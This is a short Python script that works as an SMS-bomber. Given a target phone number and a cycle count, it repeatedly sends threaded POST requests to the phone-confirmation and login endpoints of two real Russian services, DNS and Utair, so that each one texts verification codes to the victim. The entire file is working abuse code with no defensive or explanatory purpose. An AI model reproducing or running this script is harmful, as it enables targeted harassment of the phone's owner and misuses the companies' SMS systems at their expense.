import requests
import time
import argparse
from concurrent.futures import ThreadPoolExecutor

WORKING_APIS = {
    "DNS": {
        "url": "https://www.dns-shop.ru/order/order-single-page/check-and-initiate-phone-confirmation/",
        "method": "POST",
        "params": {"is_repeat": 0, "order_guid": 1}
    },
    "Utair": {
        "url": "https://b.utair.ru/api/v1/login/",
        "method": "POST",
        "data": {"login": "{phone}"}
    }
}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*"
}

def send_sms(service_name, api_data, phone):
    try:
        url = api_data["url"]
        
        if service_name == "DNS":
            params = api_data["params"].copy()
            params["phone"] = phone
            r = requests.post(url, params=params, headers=HEADERS, timeout=5)
        else:
            data = {}
            for k, v in api_data.get("data", {}).items():
                data[k] = v.replace("{phone}", phone) if isinstance(v, str) else v
            r = requests.post(url, data=data, headers=HEADERS, timeout=5)
        
        if r.status_code in [200, 201, 204]:
            print(f"[+] OK: {service_name} ({r.status_code})")
        else:
            print(f"[-] FAIL: {service_name} ({r.status_code})")
            
    except Exception as e:
        print(f"[!] ERR: {service_name} - {e}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--phone", required=True)
    parser.add_argument("-c", "--count", type=int, default=1)
    args = parser.parse_args()

    phone = args.phone
    print(f"[*] Target: {phone}")
    print(f"[*] APIs: {len(WORKING_APIS)}")
    print(f"[*] Cycles: {args.count}\n")

    try:
        for i in range(args.count):
            print(f"--- Cycle {i+1} ---")
            with ThreadPoolExecutor(max_workers=len(WORKING_APIS)) as executor:
                for name, api_data in WORKING_APIS.items():
                    executor.submit(send_sms, name, api_data, phone)
            
            if i < args.count - 1:
                time.sleep(5)
                
    except KeyboardInterrupt:
        print("\n[*] Stopped.")

if __name__ == "__main__":
    main()
